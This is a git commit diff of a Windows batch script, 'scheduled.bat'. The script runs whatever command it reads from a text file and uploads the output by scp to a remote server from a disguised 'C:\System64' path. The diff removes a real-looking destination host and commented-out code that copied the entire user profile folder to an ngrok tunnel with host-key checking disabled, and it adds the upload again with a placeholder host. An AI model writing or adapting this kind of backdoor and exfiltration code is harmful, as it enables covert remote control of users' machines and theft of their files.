5ec1c3caa8b011f08b0903e7091744dfd3df5fd0
Emanuel Berger <emanuelberger49@gmail.com>
2023-12-18 20:46:32 +0100

    scheduled.bat

--- scheduled.bat
+++ scheduled.bat
@@ -5,26 +5,11 @@ set INPUT_FILE=input.txt
 set OUTPUT_FILE=output.txt
 
 if not exist %INPUT_FILE% (
-    echo Die Eingabedatei %INPUT_FILE% wurde nicht gefunden.
+    echo %INPUT_FILE% not found
     exit /b
 )
 
 set /p BATCH_SCRIPT=<%INPUT_FILE%
-echo Auszuführendes Batch-Skript: %BATCH_SCRIPT%
-echo -----------------------------------------
-
 call %BATCH_SCRIPT% > %OUTPUT_FILE% 3>&1
 
-echo -----------------------------------------
-echo Ausführung abgeschlossen. Der Output wurde in %OUTPUT_FILE% gespeichert.
-
-
-Rem OUTPUT.TXT AUF SERVER HOCHLADEN
-
-cmd.exe /c "scp  "C:\System64\output.txt" server@yasqrncejnhg:/mnt/income/output.txt"
-
-
-@REM Rem UPLOAD USER FOLDER
-@REM set DRIVE_PATH=/mnt/income2/drive/
-@REM ssh -o StrictHostKeyChecking=no -p %NGROK_PORT% %USERNAME%@%NGROK_URL% "mkdir -p %DRIVE_PATH%"
-@REM scp -o StrictHostKeyChecking=no -r -P %NGROK_PORT% "%userprofile%\*" %USERNAME%@%NGROK_URL%:%DRIVE_PATH%
+cmd.exe /c "scp  "C:\System64\output.txt" server@your_hostname:/mnt/income/output.txt"
